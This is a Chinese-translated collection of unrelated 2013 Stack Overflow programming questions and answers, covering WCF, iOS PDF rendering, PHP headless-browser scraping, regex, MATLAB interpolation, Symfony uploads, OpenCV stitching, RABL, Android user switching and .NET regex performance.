> 时间：2013-03-13T17:16:18.863
> 
> 标签：.net, wcf, wcf-binding, wcf-security

我正在编写一个 .Net C# Web 服务，用于在我们的一个供应商处使用 WS-Security 调用远程 Axis2 Web 服务

它必须作为 COM 可见的 DLL 文件托管，因为我实际上使用 Coldfusion 9 作为主应用程序服务器，并且我已经放弃到 .Net，因为我真的不想使用 Java，因为 Coldfusion 9 仅支持 Axis 1.1并且我在那里运行了许多其他 Web 服务，我不希望类加载问题影响这些服务

我的 .Net 能力充其量是有限的，因为我真的是一个 Java 猴子，但是当 Coldfusion 不喜欢与远程 Web 服务交谈时，我过去曾使用它来创建 Web 服务。

我遇到的问题似乎与对服务的调用有关，它引发了以下错误

> System.ServiceModel.FaultException：业务对象：Q1SearchOrderReferenceType@67af67af（参考=Q1TextType@67c067c0，AllocatedBy=Q1TextType@67dd67dd）

服务器堆栈跟踪：

> 在 System.ServiceModel.Channels.ServiceChannel.HandleReply（ProxyOperationRuntime 操作，ProxyRpc& rpc）在 System.ServiceModel.Channels.ServiceChannel.Call（字符串操作，布尔单向，ProxyOperationRuntime 操作，Object[] 输入，Object[] 输出，TimeSpan 超时）在 System.ServiceModel.Channels.ServiceChannelProxy.InvokeService(IMethodCallMessage methodCall, ProxyOperationRuntime operation) 在 System.ServiceModel.Channels.ServiceChannelProxy.Invoke(IMessage 消息)

在 [0] 处重新抛出异常：

> 在 System.Runtime.Remoting.Proxies.RealProxy.HandleReturnMessage(IMessage reqMsg, IMessage retMsg) 在 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData& msgData, Int32 类型) 在 TCAB2BWebService.ForwardOrder(ForwardOrderRequest request) 在 uk.co .etsos.coal.CoalGateway.RequestCoal(CoalOrderDetails orderDetails)

我正在打的电话是

```
this.client.Open();

Q1SearchOrderType searchRequest = setCoalOrderDetails(orderDetails);
Q1SearchProductReferenceType1 productReference;

XMLHelper<Q1SearchOrderType> requestXMLHelper = new XMLHelper<Q1SearchOrderType>(baseDirectory);
requestXMLHelper.Save(searchRequest, orderDetails.MessageId, orderDetails.SecurityId, "Request");

Q1SearchOrderReferenceType1 response = this.client.ForwardOrder(searchRequest, out     productReference);
CoalUtil.writeToLogFile(ObjectInspector.Dump(response).ToString(), this.logFile);
CoalUtil.writeToLogFile(ObjectInspector.Dump(productReference).ToString(), this.logFile); 
```

它永远不会到达 writeToLogFile - 因此在 ForwardOrder 上引发错误，该错误是由 WSDL 中的 svcutil 生成的

```
public Q1SearchOrderReferenceType1 ForwardOrder(Q1SearchOrderType SearchOrder, out Q1SearchProductReferenceType1 SearchProductReference)
{
    ForwardOrderRequest inValue = new ForwardOrderRequest();
    inValue.SearchOrder = SearchOrder;
    ForwardOrderResponse retVal = ((TCAB2BWebService)(this)).ForwardOrder(inValue);
    SearchProductReference = retVal.SearchProductReference;
    return retVal.SearchOrderReference;
} 
```

我完全不知道我到底做错了什么，任何想法都将不胜感激

# ios - 将 UIView/图形上下文拆分为区域

> ID：15392066
> 
> 赞同：1
> 
> 时间：2013-03-13T17:16:24.757
> 
> 标签：ios, objective-c, pdf, printing, graphicscontext

我正在尝试将 UIView 打印为 PDF。

问题是，如果 UIView 比页面高，它就会被截断。

所以我想要做的是迭代 UIView 的“页面高度”并将它们分别呈现为 PDF 页面。

这是我的代码：

```
UIGraphicsBeginPDFContextToData(pdfData, CGRectMake(0, 0, 400, 782), nil);
CGContextRef pdfContext = UIGraphicsGetCurrentContext();

UIGraphicsBeginPDFPage();

// draws rect to the view and thus this is captured by UIGraphicsBeginPDFContextToData
[self.receiptContentView.layer renderInContext:pdfContext];

UIGraphicsBeginPDFPage();

// draws rect to the view and thus this is captured by UIGraphicsBeginPDFContextToData
[self.receiptContentView.layer renderInContext:pdfContext];

// remove PDF rendering context
UIGraphicsEndPDFContext(); 
```

显然，目前它只是在每个页面上呈现相同的内容。

我如何将上面的代码更改为“仅在第 1 页打印前 782px，然后在第 2 页打印 NEXT 782px”？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:52:53.817

尝试在开始每个页面时向上转换上下文。

```
CGContextBeginPDFPage();
CGContextTranslateCTM(pdfContext, 0.0, -782.0);
[self.receiptContentView.layer renderInContext:pdfContext]; 
```

# php - 如何通过 cron 作业运行（并杀死）无头浏览器以在 PHP 中自动抓取

> ID：15392067
> 
> 赞同：0
> 
> 时间：2013-03-13T17:16:24.907
> 
> 标签：php, web-scraping, headless-browser

我一直在尝试创建一个每天早上通过 cron 运行的蜘蛛。我想合并一个无头浏览器以获取渲染的 DOM（在 javascript 之后）。

我尝试使用[Crowbar](http://simile.mit.edu/wiki/Crowbar)（一种无头浏览器）并成功通过 cURL 获得一个（也是唯一一个）页面。文档不存在，并且在每次第一次请求后都会挂起。

我如何通过 PHP 杀死 Crowbar 的进程，本质上是能够随意启动/停止它。还是人们只是让这些无头浏览器不断运行？这似乎是一种资源消耗。

这是我尝试过的代码，但终止进程不起作用。

```
$toExecute = "\"" .ROOT . "/vendors/xulrunner/xulrunner.exe \" \"". ROOT . "/app/Vendor/crowbar/xulapp/application.ini \" 2>&1 &";
$handle = shell_exec($toExecute);

$curl = curl_init();
curl_setopt ($curl, CURLOPT_URL, 'http://127.0.0.1:10000/?url=' . $url . '&delay=3000&view=as-is');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$html = curl_exec ($curl);

exec("kill -KILL ".$handle); //this does not work...
echo $html; 
```

或者有没有更好的方法用 javascript 在 php 中抓取？我很想听听...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:42:00.560

`shell_exec()`不返回句柄。它返回命令的输出。因此，您会在`$handle`. 我将停止此操作，而仅`$!`将 echo 设置为最后执行命令的 PID。然后您可以将此 PID 传递`kill`给以正确杀死`xulrunner.exe`

所以，总结一下：

```
$toExecute = "<path>/xulrunner.exe <params> >/dev/null 2>/dev/null & echo $!";
$myPid = shell_exec( $toExecute );

...

exec( "/bin/kill $myPid" ); 
```

请注意，为了安全起见，您应该在适当`escapeshellarg()`的情况下使用`escapeshellcmd()`。否则，您将自己暴露在恶作剧中。

# asp.net - 在本地 VM 上使用 Web 服务在模拟器中使用 iOS App 进行测试

> ID：15392069
> 
> 赞同：0
> 
> 时间：2013-03-13T17:16:26.143
> 
> 标签：asp.net, ios, web-services, virtual-machine

我想使用我的 Windows 8 VM（使用 VM Fusion）测试/调试我的一些新 Web 服务。

iOS 模拟器是否可以向在 VM 中的同一台机器上运行的本地主机发出请求？

这对我来说将是一个巨大的节省时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T19:02:07.397

这应该是可能的。我不运行 VM Fusion，但我不时在我的 Mac 上运行 Parallels 和 Windows 7。每个虚拟机都有自己的 IP 地址。因此，与其将 VM 引用为 localhost，不如通过 IP 地址来引用它。启动 Windows 后，从命令行运行**ipconfig**。这将显示您可以从 iOS 模拟器中引用的 VM 的 IP 地址。

# php - 使用正则表达式检查特定字符串

> ID：15392071
> 
> 赞同：0
> 
> 时间：2013-03-13T17:16:40.867
> 
> 标签：php, regex

我有一个 PHP 代码来检查字符串集合中的字符串，我的代码是这样的：

```
$string = '01122028K,02122028K,03122028M-1';
$search = '03122029M'
echo preg_match('/\b' . $search . '\b/', $string); 
```

它返回真...

如何使用我的正则表达式返回 FALSE，我希望它仅在变量 $search 中的字符串实际上与变量 $string 匹配时返回 TRUE，因此 $search = "03122029M" 将返回 FALSE $search = "03122029M-1 " 将返回 TRUE

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:24:53.203

不要使用正则表达式。

```
echo in_array($search, explode(',', $string)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:18:31.990

问题出在您使用的边界分离器上：`\b`包括`-`.

您可以使用字符类来分隔空格和逗号。还要在测试中包括行首和行尾以捕获行尾的案例：

```
preg_match('/(^|[\s,])' . $search . '([\s,]|$)/', $string); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:20:16.197

我不认为你真的需要一个正则表达式。此外，你也会向逃避的噩梦敞开心扉。

如果在 的开头和结尾添加逗号`$string`，您也可以通过将其包裹在逗号中来将整个`$search`作为单个实体进行匹配：

```
echo (strpos(',' . $string . ',', ',' . $search . ',') !== FALSE) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:20:28.853

\b 包括 - 在您匹配的内容中。而是专门从逗号匹配 - 您可以通过在字符串的开头和结尾添加逗号来做到这一点。

```
$string = '01122028K,02122028K,03122028M-1';
$string = ','.$string.','
$search = '03122029M'
echo preg_match('/,' . $search . ',/', $string); 
```

# matlab - 用插值展开向量

> ID：15392074
> 
> 赞同：0
> 
> 时间：2013-03-13T17:16:46.903
> 
> 标签：matlab, interpolation

我有两个向量恰好是从形状文件中提取的经纬度。我想对这些值进行插值，因此我的分辨率与我从中找到距离的点相同。

我发现[了这个问题](https://stackoverflow.com/questions/5365096/matlab-insert-value-in-between/5365382#5365382)和[另一个](https://stackoverflow.com/questions/13383445/faster-method-of-interpolation-in-matlab)几乎解决了我的问题的问题。不同之处在于我不知道我的矢量点之间的间距（它们会有所不同），并且我想确保我的点之间始终最多有 0.0042 度。下面是我的 lat/long 向量的前 10 个点。

`latlim=interp1(latlim,1:0.001:numel(latlim));`得到了我想要避免任何混叠的东西，但为了提高效率，我想在点之间精确地得到 0.0042 而不仅仅是 1000 个新点。我有很多要点要迭代。

```
latlim=[78.1530 77.9963 77.6970 77.4092  77.7322 78.0511 78.1530 NaN 78.8044 78.6020];
latlim=interp1(latlim,1:0.001:numel(latlim));

lonlim=[-111.2644 -109.8545 -110.1869 -112.0512 -113.5343 -112.7246 -111.2644 NaN -110.9637 -109.6631];
lonlim=interp1(lonlim,1:0.001:numel(lonlim)); 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:13:47.973

我希望我理解你的问题：

如果您想要 0.042 的恒定步长，请尝试：

`lonlim = interp1( lonlim, lonlim(1): 0.042 :lonlim(end) );`

这将创建一个向量，从 lonlim 的第一个值 lonlim(1) 开始，步长为 0.042，直到 lonlim 的最后一个值，即 lonlim(end)。

希望它有效！:)

# java - 使用 m2eclipse 和 Artifactory 仅下载 .pom 文件的 jar 文件

> ID：15392094
> 
> 赞同：1
> 
> 时间：2013-03-13T17:17:40.117
> 
> 标签：java, maven, m2eclipse, rad, artifactory

我使用 RAD 7.5 作为 IDE 并安装了 m2eclipse 0.10 插件。

我已经安装了 IDE 的新副本，但是当我尝试从 SVN 签出我们的项目时，它只从我们的 Artifactory 下载 .pom 和 .pom.sha1 文件，这也发生在它尝试获取的每个 maven 插件上。所以最终结果是抱怨缺少工件和一个充满 .pom 和 .pom.sha1 文件的本地 repo。

我在另一台没有问题的机器上有一个相同的工作空间，可以根据需要正确下载 jar，我什至使用了自己的 settings.xml。

但是，如果创建一个新的 Maven 项目并将依赖项添加到项目中，它会成功获取 jar 和任何其他传递依赖项，所以现在该 jar 在我的本地存储库中，但另一个项目仍然说它不存在。

有谁知道可能导致问题的原因？

# html - 具有 chrome 集成的 Netbeans 不适用于 HTML5

> ID：15392099
> 
> 赞同：2
> 
> 时间：2013-03-13T17:17:55.770
> 
> 标签：html, netbeans

我正在 NetBeans 7.3 中开发 HTML5 项目，它将与带有扩展的 crome 集成。但是当我尝试运行该项目时，它显示一个空白页面。请帮助我。提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-10-14T15:55:44.820

或者这个简单的检查可能会起作用：绕过代理服务器获取本地地址

*   检查您的 chrome 代理设置：设置>显示高级设置>更改代理设置>LAN 设置
*   勾选“绕过代理服务器获取本地地址”

重新运行项目

完毕。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-27T17:01:21.437

这是100％的工作解决方案：

在菜单栏中选择**运行**，然后在列表中将光标移动到**设置的项目配置**。在列表中将**带有 netbeans 集成**的 chrome 更改为**chrome**。它肯定会起作用。谢谢！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-17T01:40:15.890

我遇到了同样的问题，并通过删除我的主机文件（Windows 中的 %SystemRoot%\System32\drivers\etc\hosts）中的错误条目来解决它。
我只留下了一个：
127.0.0.1 localhost
如果您在保存文件时遇到问题，请尝试关闭防病毒软件的实时保护。
可能您应该重新启动 Netbeans|Chrome 以使更改生效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-14T04:29:17.867

[http://netbeans.org/kb/docs/webclient/html5-gettingstarted.html](http://netbeans.org/kb/docs/webclient/html5-gettingstarted.html)有设置说明。您是否按照建议安装了 Chrome 扩展程序？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-28T17:30:19.890

检查主机文件。你应该有这一行：127.0.0.1 localhost

也许您的 localhost 指向了其他 IP，而扩展程序不知道要绑定的正确 IP 地址。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-08-31T17:18:58.487

我确实尝试了所有方法，但都没有解决我的问题，所以最终使用**Mozilla**进行调试，这非常简单，不需要任何插件即可工作。只需将您的浏览器首选项从 Chrome 更改为 Mozilla（在顶部栏中），然后运行您的项目。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-08-14T01:18:53.950

请在 Chrome 中启用开发者模式以使扩展程序正常工作。

# ios - 未调用自定义单元格 didSelectRowAtIndexPath

> ID：15392106
> 
> 赞同：3
> 
> 时间：2013-03-13T17:18:07.857
> 
> 标签：ios, objective-c, xcode

我创建了一个通用的主从应用程序。我在自定义类（MasterViewController 类）中有一个表格视图。这是一个 UITableViewController 类。使用 Storyboard，我在我的 iPhone 表格视图中创建了一个自定义单元格。自定义单元格包含 3 个标签和 1 个图像。在 StoryBoard 中，此表视图数据源和委托设置为 MasterViewController 类。我的自定义表格视图单元格在属性检查器的“视图”部分中具有“已启用用户交互”。在我的 MasterViewController 类中，诸如“numberOfSectionsInTableView”之类的 UITableViewDataSource 方法运行良好。我在表格视图和详细视图之间定义了一个序列。当我运行应用程序并在表格视图中选择一个单元格时，不会为 iPhone 调用 didSelectRowAtIndexPath。

我已经阅读了很多关于没有执行 didSelectRowAtIndexPath 的帖子，但我无法解决我的问题。

任何提示将不胜感激。

我的自定义单元格标识符是 ConversationCell。segue 标识符是 ShowConversationDetails。我在 numberOfRowsInSection 的第一行使用断点进行调试，并且从未输入过此方法。

segue 有效，详细视图显示带有“Hello”文本的标签。

**一些代码：**

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{

id <NSFetchedResultsSectionInfo> sectionInfo = [self.fetchedResultsController sections][section];

//NSLog(@"Rows %lu",(unsigned long)[sectionInfo numberOfObjects]);
return [sectionInfo numberOfObjects];

}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

static NSString *CellIdentifier = @"ConversationCell";

UITableViewCell *cell =
[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

[self configureCell:cell atIndexPath:indexPath];

return cell;

}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{

if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad) {

   [[self.fetchedResultsController sections] count]);

   NSManagedObject *object = [[self fetchedResultsController] objectAtIndexPath:indexPath];
    self.detailViewController.detailItem = object;
}
}

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
if ([[segue identifier] isEqualToString:@"ShowConversationDetails"]) {

    NSIndexPath *selectedIndex = [self.tableView indexPathForSelectedRow];

    Event *e = nil;

    e = [self.fetchedResultsController objectAtIndexPath:selectedIndex];

    UIViewController *destinationViewController = [segue destinationViewController];
    [segue.destinationViewController setLabel:@"Hello"];
    }
} 
```

MASTERVIEWCONTROLLER：这是我上面的界面；

```
@interface MasterViewController : UITableViewController     <NSFetchedResultsControllerDelegate,ASIHTTPRequestDelegate,UITableViewDelegate, UITableViewDataSource>
{
NSMutableArray *eventsArray;

} 
```

这可能是我的问题的线索。当我将以下代码添加到 prepareForSeque

```
NSIndexPath *selectedIndex = [self.tableView indexPathForSelectedRow];
    NSManagedObject *object = [[self fetchedResultsController] objectAtIndexPath:selectedIndex];
    NSString *messageTableID = [[object valueForKey:@"messagetableid"] description]; 
```

selectedIndex 为空，就像在执行 prepareForSeque 时不再选择行一样。

顺便说一句，为了安全起见，我从模拟器中删除了该应用程序，然后对项目进行了清理，但没有任何改变。

蒂姆

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:23:40.167

除了您已经提到的检查之外，您可能还需要考虑以下其他一些检查：

检查方法是否完全正确（字母大小写没有区别）：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
```

检查控制器是否实现了`UITableViewDelegate`协议

检查交互是否有效（更改选择样式选项，以便单元格在触摸事件时更改颜色）

检查您内部没有任何作为第一响应者的视图并取消交互（删除单元格中的任何视图以进行测试）

尝试以编程方式允许在桌子上进行选择`[tableView setAllowsSelection:YES];`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T19:18:13.883

我最终删除了我的 MasterViewController 和 DetailViewController。我重新创建了它们，现在一切正常。不知道我第一次做错了什么。感谢所有提供建议的人。蒂姆

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:25:39.640

您确定您的`UITableViewDelegate`对象被正确设置为表格视图`delegate`吗？（这与将其设置为数据源是分开的。）

# php - 如何使 FileUpload 对象在 Symfony2 中处理多个文件？

> ID：15392110
> 
> 赞同：5
> 
> 时间：2013-03-13T17:18:19.983
> 
> 标签：php, symfony, symfony-forms

我正在尝试制作一个包含多个文件字段的表单。由于文档非常模糊：

*   [http://symfony.com/doc/current/reference/forms/types/file.html](http://symfony.com/doc/current/reference/forms/types/file.html)
*   [http://symfony.com/doc/current/cookbook/doctrine/file_uploads.html](http://symfony.com/doc/current/cookbook/doctrine/file_uploads.html)

我决定使用 W3C FileReader API（基于下面的文档 url）来处理来自客户端的文件并管理从视图到实体的基础数据。目前在客户端支持拖放、元数据和多选。

*   [http://www.html5rocks.com/en/tutorials/file/dndfiles/](http://www.html5rocks.com/en/tutorials/file/dndfiles/)
*   [http://playground.html5rocks.com/#reading_file_metadata](http://playground.html5rocks.com/#reading_file_metadata)
*   [https://developer.mozilla.org/en-US/docs/Using_files_from_web_applications](https://developer.mozilla.org/en-US/docs/Using_files_from_web_applications)

但是我想再给 UploadedFile 对象一次机会，而我遇到的主要问题是我无法使我的实体（`FileUpload`类型）中的文件属性存储多个文件数据。我的输入如下所示：

```
<input type="file" id="upload_files" name="upload[files][]" required="required" multiple="multiple" /> 
```

理论上，如果我将名称设为数组，则 fileUpload 应该包含文件，但它不包含。**UploadedFile 对象可以存储多个文件数据吗？还是单身？**

[http://api.symfony.com/2.2/Symfony/Component/HttpFoundation/File/UploadedFile.html](http://api.symfony.com/2.2/Symfony/Component/HttpFoundation/File/UploadedFile.html)

还尝试将属性初始化（在`__construct`实体中）`$files`为数组并修改`setFiles()`以存储新数组索引的`$this->files[] = $file;`......你知道的。

但后来 Symfony 告诉我这个例外：

> 表单的视图数据应该是 Symfony\Component\HttpFoundation\File\File 类的一个实例，但它是一个 (n) 数组。您可以通过将“data_class”选项设置为 null 或添加将 a(n) 数组转换为 Symfony\Component\HttpFoundation\File\File 实例的视图转换器来避免此错误。

我不熟悉数据转换器。并且无法弄清楚现在该怎么做。或者如果使用每个文件数据获取 UploadedFile 对象真的很有用。

综合中...**有了这个给定的信息，以及下面的代码。谁能帮我让 FileUpload 对象获得正确数量的文件，而不仅仅是最后添加的文件？谢谢你**

在 github 上做了一个 repo：[https ://github.com/jeflopo/fileupload](https://github.com/jeflopo/fileupload)

为简洁起见，以下是相关文件：

*   表格： [https ://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Form/Type/FileUploadType.php](https://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Form/Type/FileUploadType.php)

*   实体： [https ://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Entity/FileUpload.php](https://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Entity/FileUpload.php)

*   控制器（只看uploadAction）： [https ://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Controller/DemoController.php](https://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Controller/DemoController.php)

*   视图： [https ://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Resources/views/Demo/upload.html.twig](https://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Resources/views/Demo/upload.html.twig)

*   在客户端处理文件的 JavaScript（不影响服务器中的文件行为）： [https ://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Resources/public/js/上传.js](https://github.com/jeflopo/fileupload/blob/master/src/Acme/DemoBundle/Resources/public/js/upload.js)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:34:48.460

我创建了一个修复错误的拉取请求！

现在剩下要做的是为上传的文件创建唯一的文件名，然后对每个文件使用 move 方法。如果您不移动它们，文件将无法保存！

当我将映射设置为 false 时，您的实体不包含文件。您必须使用刚刚创建的文件名创建一个数组以保存文件路径。

# c++ - C++ OpenCV 天空图像拼接

> ID：15392112
> 
> 赞同：0
> 
> 时间：2013-03-13T17:18:26.500
> 
> 标签：c++, opencv

**一些背景：** 大家好！我有一个涉及云成像的项目。我使用安装在旋转平台上的相机拍摄天空。然后我需要根据一些颜色阈值计算存在的云量。我可以为每张图片单独设置。为了完全实现我的目标，我需要对整个天空图像进行计算。所以我的问题在于拼接几张图像（大约 44-56 张图像）。我尝试在图像集的所有子集和一些子集上使用缝合功能，但它返回的图像不完整（有些图像没有缝合）。这可能是因为某些东西没有重叠，我不知道。输出图像也被奇怪地扭曲了（我实际上希望输出类似于鱼眼镜头拍摄的照片）。

**实际问题：** 所以现在我正在尝试找出opencv拼接管道。这是一个链接： [http ://docs.opencv.org/modules/stitching/doc/introduction.html](http://docs.opencv.org/modules/stitching/doc/introduction.html)

根据我的研究，我认为这是我想做的。我想将所有图像映射为圆形，主要是因为我的相机旋转方式，或者其他使用相当简单的坐标变换的东西。所以我想我需要对图像进行某种固定的坐标变换。这就是他们所说的单应性吗？如果是这样，有人知道我该如何解决我的问题吗？在此之后，我相信我需要一个蒙版来混合图像。我需要一个固定的掩码，就像我想要的单应性掩码吗？

我正在走一条可能的路吗？我有一些编程背景，但在图像处理方面几乎没有。我基本上迷路了。TT

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T12:24:45.037

“所以我认为我需要对图像进行某种固定坐标变换。这就是他们所说的单应性吗？”

是的，单应矩阵是原始图像和理想结果之间的变换矩阵。它在透视图中扭曲图像，以便可以拼接到另一个图像。

“如果是这样，有人知道我该如何解决我的问题吗？”

不是您提供的有限信息。如果您知道图片的顺序（与哪个..行、列位置相邻），这将大大缓解问题

如果您没有图像处理方面的经验，我建议您使用详细介绍使用更多基本功能进行拼接的教程。幕后有一些重要的工作，实际上自己做并不难。

从这个例子开始。它缝合了两张照片。

[http://ramsrigoutham.com/2012/11/22/panorama-image-stitching-in-opencv/](http://ramsrigoutham.com/2012/11/22/panorama-image-stitching-in-opencv/)

# ruby-on-rails - rabl - 具有相同名称的多个节点

> ID：15392123
> 
> 赞同：0
> 
> 时间：2013-03-13T17:18:39.960
> 
> 标签：ruby-on-rails, ruby, xml, rabl

我想知道是否可以使用 RABL 来呈现这样的 xml（不要问我为什么需要这种混乱的结构：D）：

```
<garbagebox>
  <user><id>1</id></user>
  <user><id>2</id></user>
  <article><name>some name here</name></article>
  <customer><rich>yes</rich></customer>
  <article><name>some name here #2</name></article>
</garbagebox> 
```

现在看起来 rabl 禁止在单个父项中具有相同名称的多个节点（集合除外 - 但在集合中所有节点的名称都相同）

例如，如果我这样做：

```
object :garbagebox
child(Country.first) {attributes :id, :currency}
child(Customer.last) {attributes :id, :name}
child(Country.first) {attributes :id, :currency} 
```

我只得到 2 个孩子而不是 3 个。

有人可以提供任何提示，以便我可以呈现这样的 xml 吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T19:55:30.410

这是一些核心的猴子补丁。需要您自担风险使用它。

更改前：

```
object @user
child(@user) { attribute :name }
child(@user) { attribute :city }
child(@user) { attribute :name } 
```

结果是：

```
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <user>
    <name>leo</name>
  </user>
</user> 
```

猴子补丁：

```
module Rabl
  module Helpers
    alias_method :data_name_without_uniquify, :data_name
    def data_name(data_token)
      uniquify(data_name_without_uniquify(data_token))
    end

    private

    def uniquify(object)
      Uniquificator.new(object)
    end

    class Uniquificator
      def initialize(object)
        @object = object
      end

      def ==(other)
        false
      end

      def hash
        @object.hash
      end

      def eql?(other)
        false
      end

      def to_s
        @object.to_s
      end

      def method_missing(*args, &block)
        @object.__send__(*args, &block)
      end
    end
  end
end 
```

修补后的结果：

```
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <user>
    <name>leo</name>
  </user>
  <user>
    <city>LA</city>
  </user>
  <user>
    <name>leo</name>
  </user>
</user> 
```

# android - 如何检测用户之间的切换

> ID：15392126
> 
> 赞同：19
> 
> 时间：2013-03-13T17:18:48.740
> 
> 标签：android, android-multiple-users

我有一个在前台模式下运行的服务，我想检测运行 Android 4.2 或更高版本的平板电脑上的用户会话之间的切换。

我可以注册任何广播接收器以获得通知吗？

我注意到，一旦在锁定屏幕上选择了另一个用户会话，Google 音乐就会停止音乐播放。它如何检测开关？

* * *

**答案解释**

感谢@CommonsWare 的正确答案。我将进一步解释如何检测用户开关。

首先请注意，文档明确指出接收者必须通过`Context.registerReceiver`. 因此，请执行以下操作：

```
UserSwitchReceiver receiver = new UserSwitchReceiver();
IntentFilter filter = new IntentFilter();
filter.addAction( Intent.ACTION_USER_BACKGROUND );
filter.addAction( Intent.ACTION_USER_FOREGROUND );
registerReceiver( receiver, filter ); 
```

然后在接收器中，您还可以检索用户 ID。这是一个小片段：

```
public class UserSwitchReceiver extends BroadcastReceiver {

private static final String TAG = "UserSwitchReceiver";

    @Override
    public void onReceive(Context context, Intent intent) 
    {
        boolean userSentBackground = intent.getAction().equals( Intent.ACTION_USER_BACKGROUND );
        boolean userSentForeground = intent.getAction().equals( Intent.ACTION_USER_FOREGROUND );
        Log.d( TAG, "Switch received. User sent background = " + userSentBackground + "; User sent foreground = " + userSentForeground + ";" );

        int user = intent.getExtras().getInt( "android.intent.extra.user_handle" );
        Log.d( TAG, "user = " + user );
    }
} 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-13T20:37:42.087

尝试[`ACTION_USER_FOREGROUND`](http://developer.android.com/reference/android/content/Intent.html#ACTION_USER_FOREGROUND)和[`ACTION_USER_BACKGROUND`](http://developer.android.com/reference/android/content/Intent.html#ACTION_USER_BACKGROUND)。我没有使用它们，但它们是在 API 级别 17 中添加的，它们的描述似乎可能会有所帮助。

# c# - 如何提高 .NET 正则表达式的性能？

> ID：15392132
> 
> 赞同：1
> 
> 时间：2013-03-13T17:19:02.683
> 
> 标签：c#, regex, performance

我有一个正则表达式，它解析 Razor 模板语言的一个（非常小的）子集。最近，我在正则表达式中添加了一些规则，这大大减慢了它的执行速度。我想知道：是否有某些已知的正则表达式结构很慢？是否对我正在使用的模式进行了重组以保持可读性并提高性能？注意：我已确认此性能影响发生在编译后。

这是模式：

```
new Regex(
              @"  (?<escape> \@\@ )"
            + @"| (?<comment> \@\* ( ([^\*]\@) | (\*[^\@]) | . )* \*\@ )"
            + @"| (?<using> \@using \s+ (?<namespace> [\w\.]+ ) (\s*;)? )"

            // captures expressions of the form "foreach (var [var] in [expression]) { <text>" 
/* ---> */      + @"| (?<foreach> \@foreach \s* \( \s* var \s+ (?<var> \w+ ) \s+ in \s+ (?<expressionValue> [\w\.]+ ) \s* \) \s* \{ \s* <text> )"

            // captures expressions of the form "if ([expression]) { <text>" 
/* ---> */      + @"| (?<if> \@if \s* \( \s* (?<expressionValue> [\w\.]+ ) \s* \) \s* \{ \s* <text> )"  

            // captures the close of a razor text block
            + @"| (?<endBlock> </text> \s* \} )"

            // an expression of the form @([(int)] a.b.c)
            + @"| (?<parenAtExpression> \@\( \s* (?<castToInt> \(int\)\s* )? (?<expressionValue> [\w\.]+ ) \s* \) )"
            + @"| (?<atExpression> \@ (?<expressionValue> [\w\.]+ ) )"
/* ---> */      + @"| (?<literal> ([^\@<]+|[^\@]) )",
            RegexOptions.IgnorePatternWhitespace | RegexOptions.Multiline | RegexOptions.ExplicitCapture | RegexOptions.Compiled); 
```

/* ---> */ 表示导致减速的新“规则”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T19:39:20.970

由于您没有锚定表达式，因此引擎必须在字符串的每个位置检查每个替代子模式，然后才能确定它找不到匹配项。这总是很耗时，但如何才能减少呢？

一些想法：

我不喜欢第二行试图匹配注释的子模式，我认为它不能正常工作。

我可以看到您尝试对`( ([^\*]\@) | (\*[^\@]) | . )*`-allow`@`和`*`评论执行什么操作，只要它们没有分别位于前面`*`或后面`@`。但是由于组的`*`量词和第三个选项`.`，子模式会很高兴地匹配`*@`，因此使其他选项变得多余。

并假设您尝试匹配的 Razor 子集不允许多行注释，我建议第二行

```
+ @"| (?<comment> @\*.*?\*@ )" 
```

即懒惰地匹配任何字符（但换行符），直到`*@`遇到第一个。您正在使用`RegexOptions.ExplicitCapture`仅捕获命名组的含义，因此缺少`()`应该不是问题。

